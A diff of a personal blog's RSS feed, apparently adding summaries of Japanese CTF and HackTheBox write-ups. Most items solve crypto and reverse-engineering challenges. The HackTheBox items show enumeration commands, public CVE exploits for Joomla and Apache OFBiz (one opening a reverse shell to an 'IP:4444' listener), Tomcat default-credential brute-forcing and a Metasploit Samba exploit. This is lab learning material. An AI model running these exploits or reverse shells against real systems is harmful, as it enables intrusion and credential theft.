@@ -6,7 +6,124 @@
     <description>Recent content in Writeups on お茶は綾鷹派</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Sun, 07 Apr 2024 05:14:09 +0900</lastBuildDate><atom:link href="http://side-realms.github.io/writeup/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Tue, 13 Aug 2024 23:18:46 +0900</lastBuildDate><atom:link href="http://side-realms.github.io/writeup/index.xml" rel="self" type="application/rss+xml" />
+    <item>
+      <title>LITCTF2024</title>
+      <link>http://side-realms.github.io/writeup/litctf2024/</link>
+      <pubDate>Tue, 13 Aug 2024 23:18:46 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/litctf2024/</guid>
+      <description>Crypto simple otp 与えられた鍵と XOR する
+import random encoded_with_xor = b&amp;#39;\x81Nx\x9b\xea)\xe4\x11\xc5 e\xbb\xcdR\xb7\x8f:\xf8\x8bJ\x15\x0e.n\\-/4\x91\xdcN\x8a&amp;#39; random.seed(0) key = random.randbytes(32) #print(key ^ encoded_with_xor) print(bytes(a ^ b for a, b in zip(key, encoded_with_xor))) privatekey N = 91222155440553152389498614260050699731763350575147080767270489977917091931170943138928885120658877746247611632809405330094823541534217244038578699660880006339704989092479659053257803665271330929925869501196563443668981397902668090043639708667461870466802555861441754587186218972034248949207279990970777750209 e = 89367874380527493290104721678355794851752244712307964470391711606074727267038562743027846335233189217972523295913276633530423913558009009304519822798850828058341163149186400703842247356763254163467344158854476953789177826969005741218604103441014310747381924897883873667049874536894418991242502458035490144319 c = 71713040895862900826227958162735654909383845445237320223905265447935484166586100020297922365470898490364132661022898730819952219842679884422062319998678974747389086806470313146322055888525887658138813737156642494577963249790227961555514310838370972597205191372072037773173143170516757649991406773514836843206 e がデカい
+import owiener from Crypto.Util.number import * e = ... n = ... c = ... d = owiener.attack(e, n) print(&amp;#34;d={}&amp;#34;.format(d)) plain = pow(c, d, n) print(long_to_bytes(plain).strip()) pope shuffle it&amp;rsquo;s like caesar cipher but better.</description>
+    </item>
+    
+    <item>
+      <title>WaniCTF2024</title>
+      <link>http://side-realms.github.io/writeup/wanictf2024/</link>
+      <pubDate>Tue, 25 Jun 2024 18:50:04 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/wanictf2024/</guid>
+      <description>waniCTF に半日参加しました． 友達はいないのでソロです．
+writeup crypto beginners_rsa from Crypto.Util.number import * p = getPrime(64) q = getPrime(64) r = getPrime(64) s = getPrime(64) a = getPrime(64) n = p*q*r*s*a e = 0x10001 FLAG = b&amp;#39;FLAG{This_is_a_fake_flag}&amp;#39; m = bytes_to_long(FLAG) enc = pow(m, e, n) print(f&amp;#39;n = {n}&amp;#39;) print(f&amp;#39;e = {e}&amp;#39;) print(f&amp;#39;enc = {enc}&amp;#39;) Multi Prime RSA です． 与えられた n は簡単に素因数分解できるので，d が求まり，簡単に復号できます. 素因数分解はなんでもいいんですが今回は Msieve を使いました(参考).
+from Crypto.Util.number import inverse, long_to_bytes n = 317903423385943473062528814030345176720578295695512495346444822768171649361480819163749494400347 e = 0x10001 enc = 127075137729897107295787718796341877071536678034322988535029776806418266591167534816788125330265 p = 9953162929836910171 q = 11771834931016130837 r = 12109985960354612149 s = 13079524394617385153 a = 17129880600534041513 phi_n = (p - 1) * (q - 1) * (r - 1) * (s - 1) * (a - 1) d = inverse(e, phi_n) m = pow(enc, d, n) FLAG = long_to_bytes(m) print(FLAG) beginners_aes from Crypto.</description>
+    </item>
+    
+    <item>
+      <title>Cryptohack2</title>
+      <link>http://side-realms.github.io/writeup/cryptohack2/</link>
+      <pubDate>Sun, 09 Jun 2024 20:08:31 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/cryptohack2/</guid>
+      <description>Structure of AES def matrix2bytes(matrix): &amp;#34;&amp;#34;&amp;#34; Converts a 4x4 matrix into a 16-byte array. &amp;#34;&amp;#34;&amp;#34; for i in range(4): for j in range(4): print(str(long_to_bytes(matrix[i][j]))[2:-1], end=&amp;#39;&amp;#39;) Round Key def add_round_key(s, k): for i in range(4): for j in range(4): state[i][j] = state[i][j] ^ round_key[i][j] return (state) print(matrix2bytes(add_round_key(state, round_key))) Confusion through Substitution from Crypto.Util.number import long_to_bytes def matrix2bytes(matrix): &amp;#34;&amp;#34;&amp;#34; Converts a 4x4 matrix into a 16-byte array. &amp;#34;&amp;#34;&amp;#34; for i in range(4): for j in range(4): print(str(long_to_bytes(matrix[i][j]))[2:-1], end=&amp;#39;&amp;#39;) def sub_bytes(s, sbox=s_box): for i in range(4): for j in range(4): tmp = str(hex(s[i][j]))[2:] #print(tmp[0]) s[i][j] = sbox[int(tmp, base=16)] return(state) Diffusion through Permutation def inv_shift_rows(s): s[0][1], s[1][1], s[2][1], s[3][1] = s[3][1], s[0][1], s[1][1], s[2][1] s[0][2], s[1][2], s[2][2], s[3][2] = s[2][2], s[3][2], s[0][2], s[1][2] s[0][3], s[1][3], s[2][3], s[3][3] = s[1][3], s[2][3], s[3][3], s[0][3] inv_mix_columns(state) inv_shift_rows(state) print(matrix2bytes(state)) Bringing It All Together N_ROUNDS = 10 key = b&amp;#39;\xc3,\\\xa6\xb5\x80^\x0c\xdb\x8d\xa5z*\xb6\xfe\\&amp;#39; ciphertext = b&amp;#39;\xd1O\x14j\xa4+O\xb6\xa1\xc4\x08B)\x8f\x12\xdd&amp;#39; s_box = ( 0x63, 0x7C, 0x77, 0x7B, 0xF2, 0x6B, 0x6F, 0xC5, 0x30, 0x01, 0x67, 0x2B, 0xFE, 0xD7, 0xAB, 0x76, 0xCA, 0x82, 0xC9, 0x7D, 0xFA, 0x59, 0x47, 0xF0, 0xAD, 0xD4, 0xA2, 0xAF, 0x9C, 0xA4, 0x72, 0xC0, 0xB7, 0xFD, 0x93, 0x26, 0x36, 0x3F, 0xF7, 0xCC, 0x34, 0xA5, 0xE5, 0xF1, 0x71, 0xD8, 0x31, 0x15, 0x04, 0xC7, 0x23, 0xC3, 0x18, 0x96, 0x05, 0x9A, 0x07, 0x12, 0x80, 0xE2, 0xEB, 0x27, 0xB2, 0x75, 0x09, 0x83, 0x2C, 0x1A, 0x1B, 0x6E, 0x5A, 0xA0, 0x52, 0x3B, 0xD6, 0xB3, 0x29, 0xE3, 0x2F, 0x84, 0x53, 0xD1, 0x00, 0xED, 0x20, 0xFC, 0xB1, 0x5B, 0x6A, 0xCB, 0xBE, 0x39, 0x4A, 0x4C, 0x58, 0xCF, 0xD0, 0xEF, 0xAA, 0xFB, 0x43, 0x4D, 0x33, 0x85, 0x45, 0xF9, 0x02, 0x7F, 0x50, 0x3C, 0x9F, 0xA8, 0x51, 0xA3, 0x40, 0x8F, 0x92, 0x9D, 0x38, 0xF5, 0xBC, 0xB6, 0xDA, 0x21, 0x10, 0xFF, 0xF3, 0xD2, 0xCD, 0x0C, 0x13, 0xEC, 0x5F, 0x97, 0x44, 0x17, 0xC4, 0xA7, 0x7E, 0x3D, 0x64, 0x5D, 0x19, 0x73, 0x60, 0x81, 0x4F, 0xDC, 0x22, 0x2A, 0x90, 0x88, 0x46, 0xEE, 0xB8, 0x14, 0xDE, 0x5E, 0x0B, 0xDB, 0xE0, 0x32, 0x3A, 0x0A, 0x49, 0x06, 0x24, 0x5C, 0xC2, 0xD3, 0xAC, 0x62, 0x91, 0x95, 0xE4, 0x79, 0xE7, 0xC8, 0x37, 0x6D, 0x8D, 0xD5, 0x4E, 0xA9, 0x6C, 0x56, 0xF4, 0xEA, 0x65, 0x7A, 0xAE, 0x08, 0xBA, 0x78, 0x25, 0x2E, 0x1C, 0xA6, 0xB4, 0xC6, 0xE8, 0xDD, 0x74, 0x1F, 0x4B, 0xBD, 0x8B, 0x8A, 0x70, 0x3E, 0xB5, 0x66, 0x48, 0x03, 0xF6, 0x0E, 0x61, 0x35, 0x57, 0xB9, 0x86, 0xC1, 0x1D, 0x9E, 0xE1, 0xF8, 0x98, 0x11, 0x69, 0xD9, 0x8E, 0x94, 0x9B, 0x1E, 0x87, 0xE9, 0xCE, 0x55, 0x28, 0xDF, 0x8C, 0xA1, 0x89, 0x0D, 0xBF, 0xE6, 0x42, 0x68, 0x41, 0x99, 0x2D, 0x0F, 0xB0, 0x54, 0xBB, 0x16, ) inv_s_box = ( 0x52, 0x09, 0x6A, 0xD5, 0x30, 0x36, 0xA5, 0x38, 0xBF, 0x40, 0xA3, 0x9E, 0x81, 0xF3, 0xD7, 0xFB, 0x7C, 0xE3, 0x39, 0x82, 0x9B, 0x2F, 0xFF, 0x87, 0x34, 0x8E, 0x43, 0x44, 0xC4, 0xDE, 0xE9, 0xCB, 0x54, 0x7B, 0x94, 0x32, 0xA6, 0xC2, 0x23, 0x3D, 0xEE, 0x4C, 0x95, 0x0B, 0x42, 0xFA, 0xC3, 0x4E, 0x08, 0x2E, 0xA1, 0x66, 0x28, 0xD9, 0x24, 0xB2, 0x76, 0x5B, 0xA2, 0x49, 0x6D, 0x8B, 0xD1, 0x25, 0x72, 0xF8, 0xF6, 0x64, 0x86, 0x68, 0x98, 0x16, 0xD4, 0xA4, 0x5C, 0xCC, 0x5D, 0x65, 0xB6, 0x92, 0x6C, 0x70, 0x48, 0x50, 0xFD, 0xED, 0xB9, 0xDA, 0x5E, 0x15, 0x46, 0x57, 0xA7, 0x8D, 0x9D, 0x84, 0x90, 0xD8, 0xAB, 0x00, 0x8C, 0xBC, 0xD3, 0x0A, 0xF7, 0xE4, 0x58, 0x05, 0xB8, 0xB3, 0x45, 0x06, 0xD0, 0x2C, 0x1E, 0x8F, 0xCA, 0x3F, 0x0F, 0x02, 0xC1, 0xAF, 0xBD, 0x03, 0x01, 0x13, 0x8A, 0x6B, 0x3A, 0x91, 0x11, 0x41, 0x4F, 0x67, 0xDC, 0xEA, 0x97, 0xF2, 0xCF, 0xCE, 0xF0, 0xB4, 0xE6, 0x73, 0x96, 0xAC, 0x74, 0x22, 0xE7, 0xAD, 0x35, 0x85, 0xE2, 0xF9, 0x37, 0xE8, 0x1C, 0x75, 0xDF, 0x6E, 0x47, 0xF1, 0x1A, 0x71, 0x1D, 0x29, 0xC5, 0x89, 0x6F, 0xB7, 0x62, 0x0E, 0xAA, 0x18, 0xBE, 0x1B, 0xFC, 0x56, 0x3E, 0x4B, 0xC6, 0xD2, 0x79, 0x20, 0x9A, 0xDB, 0xC0, 0xFE, 0x78, 0xCD, 0x5A, 0xF4, 0x1F, 0xDD, 0xA8, 0x33, 0x88, 0x07, 0xC7, 0x31, 0xB1, 0x12, 0x10, 0x59, 0x27, 0x80, 0xEC, 0x5F, 0x60, 0x51, 0x7F, 0xA9, 0x19, 0xB5, 0x4A, 0x0D, 0x2D, 0xE5, 0x7A, 0x9F, 0x93, 0xC9, 0x9C, 0xEF, 0xA0, 0xE0, 0x3B, 0x4D, 0xAE, 0x2A, 0xF5, 0xB0, 0xC8, 0xEB, 0xBB, 0x3C, 0x83, 0x53, 0x99, 0x61, 0x17, 0x2B, 0x04, 0x7E, 0xBA, 0x77, 0xD6, 0x26, 0xE1, 0x69, 0x14, 0x63, 0x55, 0x21, 0x0C, 0x7D, ) def bytes2matrix(text): return [list(text[i:i+4]) for i in range(0, len(text), 4)] def matrix2bytes(matrix): out = [] for r in matrix: for c in r: out.</description>
+    </item>
+    
+    <item>
+      <title>HTB_devvortex</title>
+      <link>http://side-realms.github.io/writeup/htb_devvortex/</link>
+      <pubDate>Sat, 08 Jun 2024 15:25:30 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/htb_devvortex/</guid>
+      <description>user nmap ssh, http http まず ffuf で subdomain を探す ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://devvortex.htb -H &amp;quot;Host: FUZZ.devvortex.htb&amp;quot; -fw 4 -t 100 次にディレクトリを探す ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt:FUZZ -u http://dev.vortex.htb/FUZZ -t 100 -ic /administrator が見つかる Joomla! で動いている Joomla! https://book.hacktricks.xyz/network-services-pentesting/pentesting-web/joomla version を見つける /administrator/manifests/files/joomla.xml CVE が刺さる https://github.com/Acceis/exploit-CVE-2023-23752 ruby exploit.rb http://dev.devvortex.htb Users [649] lewis (lewis) - lewis@devvortex.htb - Super Users [650] logan paul (logan) - logan@devvortex.htb - Registered Site info Site name: Development Editor: tinymce Captcha: 0 Access: 1 Debug status: false Database info DB type: mysqli DB host: localhost DB user: lewis DB password: P4ntherg0t1n5r3c0n## DB name: joomla DB prefix: sd4fg_ DB encryption 0 revshell Template -&amp;gt; Customise(Cassiopeia) を編集する error.</description>
+    </item>
+    
+    <item>
+      <title>HTB: Bizness</title>
+      <link>http://side-realms.github.io/writeup/htb_bizness/</link>
+      <pubDate>Wed, 05 Jun 2024 04:49:04 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/htb_bizness/</guid>
+      <description>user nmap ssh, http, ssl/http あたり http アクセスでサイトが立ち上がる ffuf /control OFBiz らしい こういうのはまず公式サイトから構成を簡単にさらう OFBiz Registered User が見つかる 下にバージョンが書いてある HTB の方でもバージョンを探せ，とあるのでおそらく CVE がある https://github.com/UserConnecting/Exploit-CVE-2023-49070-and-CVE-2023-51467-Apache-OFBiz CVE CVE が刺さる python3 ofbiz_exploit.py https://bizness.htb shell IP:4444 shell shell に入れた /home/ofbiz/user.txt root sudo -l 無理でした Derby /opt/ofbiz に色々インストールされてる config を見ると SHA が ~ とかいろいろ書かれている ofbiz@bizness:/opt/ofbiz/framework/security/config$ cat security.properties derby に関するファイルを探す /opt/ofbiz/runtime/data/derby 列挙すると seg0 に .dat がたくさん入ってる find . -type f -name “*.dat” -exec grep “SHA” {} \; c5490.</description>
+    </item>
+    
+    <item>
+      <title>HTB: Beginner</title>
+      <link>http://side-realms.github.io/writeup/beginner/</link>
+      <pubDate>Fri, 24 May 2024 21:22:04 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/beginner/</guid>
+      <description>HTB, しばらくやってなかったらアカウント忘れてしまった
+新しくアカウントを作って starting point も終えたので，やっていきたい
+Weak RSA from Crypto.PublicKey import RSA pubkey = RSA.importKey(open(&amp;#34;key.pub&amp;#34;).read()) e = pubkey.e n = pubkey.n print(&amp;#34;e :&amp;#34;, e) print(&amp;#34;n :&amp;#34;, n) これで e, n を計算する． e が巨大なので以下のように攻撃する
+import owiener from Crypto.Util.number import * e = 68180928631284147212820507192605734632035524131139938618069575375591806315288775310503696874509130847529572462608728019290710149661300246138036579342079580434777344111245495187927881132138357958744974243365962204835089753987667395511682829391276714359582055290140617797814443530797154040685978229936907206605 n = 573177824579630911668469272712547865443556654086190104722795509756891670023259031275433509121481030331598569379383505928315495462888788593695945321417676298471525243254143375622365552296949413920679290535717172319562064308937342567483690486592868352763021360051776130919666984258847567032959931761686072492923 d = owiener.attack(e, n) if d is None: print(&amp;#34;Failed&amp;#34;) else: print(&amp;#34;d={}&amp;#34;.format(d)) with open(&amp;#39;flag.enc&amp;#39;, &amp;#39;rb&amp;#39;) as ct: sc = bytes_to_long(ct.read()) plain = pow(c, d, n) print(long_to_bytes(plain).strip()) Jerry nmap: http-proxy 8080 ip:8080 にアクセスする tomcat が開いている /manager/html が管理画面っぽい デフォルトパスワードをブルートフォースすると tomcat:s3cret で通る .</description>
+    </item>
+    
+    <item>
+      <title>Lame</title>
+      <link>http://side-realms.github.io/writeup/lame/</link>
+      <pubDate>Wed, 22 May 2024 21:27:57 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/lame/</guid>
+      <description>user enum4linux Sharename Type Comment --------- ---- ------- print$ Disk Printer Drivers tmp Disk oh noes! opt Disk IPC$ IPC IPC Service (lame server (Samba 3.0.20-Debian)) ADMIN$ IPC IPC Service (lame server (Samba 3.0.20-Debian)) Reconnecting with SMB1 for workgroup listing. Server Comment --------- ------- Workgroup Master --------- ------- WORKGROUP LAME tmp で anonymous ログインができる ファイルを見てみたがよく分からなかった vmware の authlog のようなものがある samba 3.0.20 がある metasploit で調べると exploit が見つかる 刺さる root metasploit の exploit で root ログインだったので root も手に入れた </description>
+    </item>
+    
+    <item>
+      <title>Rev を雑多に解く1</title>
+      <link>http://side-realms.github.io/writeup/rev_1/</link>
+      <pubDate>Mon, 06 May 2024 05:03:30 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/rev_1/</guid>
+      <description>SECCON Beginners 2023 Half strings で見える
+ctf4b{ge4_t0_kn0w_the_bin4ry_fi1e_with_s4ring3}
+Three length = strlen(input); if (length == 0x31) { for (local_c = 0; local_c &amp;lt; 0x31; local_c = local_c + 1) { if (local_c % 3 == 0) { cVar1 = (char)*(undefined4 *)(flag_0 + (long)(local_c / 3) * 4); } else if (local_c % 3 == 1) { cVar1 = (char)*(undefined4 *)(flag_1 + (long)(local_c / 3) * 4); } else { cVar1 = (char)*(undefined4 *)(flag_2 + (long)(local_c / 3) * 4); } if (cVar1 !</description>
+    </item>
+    
+    <item>
+      <title>Cryptohack1</title>
+      <link>http://side-realms.github.io/writeup/cryptohack/</link>
+      <pubDate>Sat, 04 May 2024 22:10:33 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/cryptohack/</guid>
+      <description>Encoding Challenge from pwn import * # pip install pwntools import json import base64 import codecs r = remote(&amp;#39;socket.cryptohack.org&amp;#39;, 13377) def json_recv(): line = r.recvline() return json.loads(line.decode()) def json_send(hsh): request = json.dumps(hsh).encode() r.sendline(request) def decoding(types, received): if(types == &amp;#34;base64&amp;#34;): answer = base64.b64decode(received).decode() return answer if(types == &amp;#34;hex&amp;#34;): answer = str(bytes.fromhex(received)) return answer[2:len(answer)-1] if(types == &amp;#34;rot13&amp;#34;): answer = codecs.encode(received, &amp;#39;rot_13&amp;#39;) return answer if(types == &amp;#34;bigint&amp;#34;): answer = str(bytes.fromhex(received[2:])) return answer[2:len(answer)-1] if(types == &amp;#34;utf-8&amp;#34;): answer = &amp;#34;&amp;#34; for i in received: answer += chr(i) return answer while (True): received = json_recv() print(&amp;#34;Received type: &amp;#34;, end=&amp;#34;&amp;#34;) print(received[&amp;#34;type&amp;#34;]) print(&amp;#34;Received encoded value: &amp;#34;, end=&amp;#34;&amp;#34;) print(received[&amp;#34;encoded&amp;#34;]) answer = decoding(received[&amp;#34;type&amp;#34;], received[&amp;#34;encoded&amp;#34;]) print(&amp;#34;answer: &amp;#34;, end=&amp;#34;&amp;#34;) print(answer) to_send = {&amp;#34;decoded&amp;#34;: answer} request = json.</description>
+    </item>
+    
+    <item>
+      <title>picoCTF - web</title>
+      <link>http://side-realms.github.io/writeup/picoweb/</link>
+      <pubDate>Thu, 02 May 2024 10:39:24 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/picoweb/</guid>
+      <description>なかなか初心者を抜け出せないので，量をこなそう作戦
+解いたことがある問題は記載しない
+WebDecode 開発者ツール的なので About ページを見ると怪しい文字列があるので，base64 デコード
+Intro to Burp アカウントを作ると OTP を求められる． リクエストの otp= を消してリクエストを送ると OK
+curl -X POST http://titan.picoctf.net:54630/dashboard -H &#39;Cookie: session=.eJxdjDkOwyAUBe9CnQIwi8llEBhQkA0fsciKotw9tKSct8wHHbG_0RPFMybIgB7oaDXoDqfPMxZSWYUp3VwQnOzMcUbMrri1WAbiFSaUGSnU_IVxXTqb5Bcb9DKZ4U1wPrGY1m6obtmUF2Sv80jW16UYzdc_4_cH_-A4Iw.ZjLzXA.osPDJuPjvfZFlwhe-7dVDbKhZj0&#39;
+Unminify 開発者ツールを見る
+Trickster 画像をアップロードできる． アップロードできる系はシェルが通りそうなことを HTB で学んだのでやってみる．
+User-agent: * Disallow: /instructions.txt Disallow: /uploads/ robots.txt から /uploads/ にアップロードした画像が置いてあるような気がする． また，X-Powered-By を見れば PHP 製であることが分かるので，PHP が通る．
+さらに instructions.txt を見ると，ut wikipedia says that the first few bytes contain &#39;PNG&#39; in hexadecimal: &amp;quot;50 4E 47&amp;quot; ) みたいに書いてあるので， 50 4E 47 -&amp;gt; PNG が書いてあればいいんだと思う</description>
+    </item>
+    
+    <item>
+      <title>picoCTF の rev 全部解く</title>
+      <link>http://side-realms.github.io/writeup/picorev/</link>
+      <pubDate>Sun, 07 Apr 2024 19:40:38 +0900</pubDate>
+      
+      <guid>http://side-realms.github.io/writeup/picorev/</guid>
+      <description>CTF の問題を解いていると，解けはするけど異常に時間がかかる，みたいなことが多い． rev に限れば，これは，ツールの使い方が甘かったり，つまみ食い的に rev をやってきたので常識が欠落していて遠回りしていたり，そもそもデコンパイル結果を読む筋力が全然なかったりすることが原因だと分かっている． なので，数をこなそう作戦で，知り合いにオススメされた picoCTF の rev を全部解いてみる． 2~3 日くらいで完走できたら良い
+Transformation &#39;&#39;.join([chr((ord(flag[i]) &amp;lt;&amp;lt; 8) + ord(flag[i + 1])) for i in range(0, len(flag), 2)]) をデコードする encoded_flag = &amp;#34;灩捯䍔䙻ㄶ形楴獟楮獴㌴摟潦弸弲㘶㠴挲ぽ&amp;#34; flag = [] for i in range(len(encoded_flag)): tmp1 = ord(encoded_flag[i]) &amp;amp; 0xFF tmp2 = ord(encoded_flag[i]) &amp;gt;&amp;gt; 8 flag += chr(tmp2) flag += chr(tmp1) print(&amp;#34;&amp;#34;.join(flag)) keygenme-py Arcane Calculator なるものが動いていて，ライセンスを入れるといいらしい def check_key(key, username_trial): global key_full_template_trial if len(key) != len(key_full_template_trial): return False else: # Check static base key part --v i = 0 for c in key_part_static1_trial: if key[i] !</description>
+    </item>
+    
     <item>
       <title>Anonforce</title>
       <link>http://side-realms.github.io/writeup/anonforce/</link>
